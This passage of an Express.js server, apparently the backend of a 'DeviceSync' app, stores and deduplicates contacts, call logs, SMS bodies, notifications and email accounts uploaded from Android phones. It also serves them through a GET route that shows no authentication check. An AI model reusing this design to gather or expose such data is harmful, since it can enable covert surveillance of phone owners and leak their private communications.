                console.log(`🔍 Sample dataHash from mappedItems:`, mappedItems.slice(0, 3).map(item => item.dataHash));
            }
            console.log(`📋 Found ${existingData.length} existing records for ${dataType}`);
            
        } catch (error) {
            console.error(`❌ Error fetching existing data:`, error);
        }

        // STEP 3: Filter out items that already exist
        const newItems = [];
        
        for (const mappedItem of mappedItems) {
            let exists = false;
            
            // Check if item already exists
            for (const existing of existingData) {
                let match = false;
                
                switch (dataType) {
                    case 'CONTACTS':
                        match = existing.phoneNumber === mappedItem.phoneNumber;
                        break;
                    case 'CALL_LOGS':
                        match = existing.phoneNumber === mappedItem.phoneNumber &&
                                existing.timestamp.getTime() === mappedItem.timestamp.getTime() &&
                                existing.duration === mappedItem.duration;
                        break;
                    case 'MESSAGES':
                        match = existing.address === mappedItem.address &&
                                existing.timestamp.getTime() === mappedItem.timestamp.getTime() &&
                                existing.body === mappedItem.body;
                        break;
                    case 'NOTIFICATIONS':
                        match = existing.dataHash === mappedItem.dataHash;
                        break;
                    case 'EMAIL_ACCOUNTS':
                        match = existing.dataHash === mappedItem.dataHash;
                        break;
                }
                
                if (match) {
                    exists = true;
                    break;
                }
            }
            
            if (!exists) {
                newItems.push(mappedItem);
            }
        }
        
        console.log(`🆕 New items to insert: ${newItems.length}`);

        // STEP 4: Perform bulk insert only
        let insertedCount = 0;
        
        if (newItems.length > 0) {
            try {
                const insertResult = await Model.insertMany(newItems, { 
                    ordered: false, // Continue on errors
                    rawResult: true 
                });
                insertedCount = insertResult.insertedCount || newItems.length;
                console.log(`✅ Bulk inserted ${insertedCount} new ${dataType} items`);
            } catch (insertError) {
                console.error(`❌ Bulk insert error:`, insertError);
                // Fallback to individual inserts for failed items
                for (const item of newItems) {
                    try {
                        await Model.create(item);
                        insertedCount++;
                    } catch (error) {
                        console.error(`❌ Individual insert failed:`, error);
                    }
                }
            }
        }
        
        console.log(`🎉 BULK INSERT COMPLETE: ${insertedCount} ${dataType} items inserted`);
        
        res.json({
            success: true,
            data: {
                success: true,
                itemsInserted: insertedCount,
                itemsSkipped: data.length - insertedCount,
                lastSyncTime: new Date(),
                message: `BULK INSERT: ${insertedCount} ${dataType} items inserted successfully`
            }
        });
        
    } catch (error) {
        console.error('❌ Bulk insert error:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to sync data',
            message: error.message
        });
    }
});

// Get live data from main database
app.get('/api/data/:dataType', async (req, res) => {
    try {
        const { dataType } = req.params;
        const { page = 1, limit = 100 } = req.query;
        
        let Model;
        
        // Determine which model to use based on data type (main collections)
        switch (dataType) {
            case 'contacts':
                Model = Contact;
                break;
            case 'calllogs':
                Model = CallLog;
                break;
            case 'messages':
                Model = Message;
                break;
            case 'notifications':
                Model = Notification;
                break;
            case 'emailaccounts':
                Model = EmailAccount;
                break;
            default:
                return res.status(400).json({
                    success: false,
                    error: `Unsupported data type: ${dataType}`
                });
        }
        
        const data = await Model.find({})
            .sort({ syncedAt: -1 })
            .limit(limit * 1)
            .skip((page - 1) * limit);
        
        const total = await Model.countDocuments({});
        
        res.json({
            success: true,
            data: {
                dataType,
                items: data,
                pagination: {
                    current: page,
                    pages: Math.ceil(total / limit),
                    total
                }
            }
        });
        
    } catch (error) {
        console.error('Error getting live data:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to get live data'
        });
    }
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 DeviceSync Backend Server running on http://localhost:${PORT}`);
    console.log(`📱 API Base URL: http://localhost:${PORT}/api/`);
    console.log(`🏥 Health Check: http://localhost:${PORT}/api/health`);
    console.log(`📱 For Android Emulator: http://10.0.2.2:${PORT}/api/`);
    console.log(`🗄️  Database: MongoDB (sync_data)`);
    console.log(`✅ Core syncing ready: Contacts, CallLogs, Messages, Notifications, EmailAccounts`);
}); // Force redeploy - Mon Jul 28 00:38:34 +04 2025
